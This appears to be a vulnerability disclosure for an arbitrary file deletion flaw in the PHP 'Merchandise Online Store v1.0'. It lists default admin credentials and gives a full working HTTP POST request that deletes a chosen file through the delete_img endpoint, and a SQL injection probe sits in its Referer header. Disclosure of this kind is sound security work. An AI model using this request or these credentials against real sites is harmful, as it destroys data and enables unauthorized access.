# Merchandise Online Store v1.0 by oretnom23 has Delete any file

vendors: https://www.sourcecodester.com/php/14887/merchandise-online-store-php-free-source-code.html

Vulnerability File: /vloggers_merch/classes/Master.php?f=delete_img

Vulnerability location: /vloggers_merch/classes/Master.php?f=delete_img, path

The password for the backend login account is: admin/admin123

Payload:

Here we delete the shel.php file in the root directory

```sql
POST /vloggers_merch/classes/Master.php?f=delete_img HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.19/vloggers_merch/admin/?page=product/manage_product&id=5%27%20and%20length(database())%20=17%20--+
Content-Length: 55
Cookie: PHPSESSID=n23o4bgngdq5q3js6l0a0i6r6k
Connection: close

path=C%3A%2Fxampp%2Fhtdocs%2Fvloggers_merch%2Fshell.php
```

The file path needs to be encoded by url
![image](https://user-images.githubusercontent.com/54017627/166877984-f936ed3a-5710-4482-b086-ffcf28f414a0.png)


At present, the shell.php file is still in the root directory of the website, when we send a request to delete the shell.php file
![image](https://user-images.githubusercontent.com/54017627/166878043-b939040f-0d9b-4ec6-8de2-ca2f757ccd23.png)

The response package shows that the deletion was successful. Let's go to the root directory to see if the shell.php file still exists.
![image](https://user-images.githubusercontent.com/54017627/166878088-e1100326-6a36-4e38-9921-fdd8f181a0b8.png)


By this time, shell.php has been deleted.
![image](https://user-images.githubusercontent.com/54017627/166878117-b67250be-3bc5-4e5e-b0d9-2c6e62398512.png)


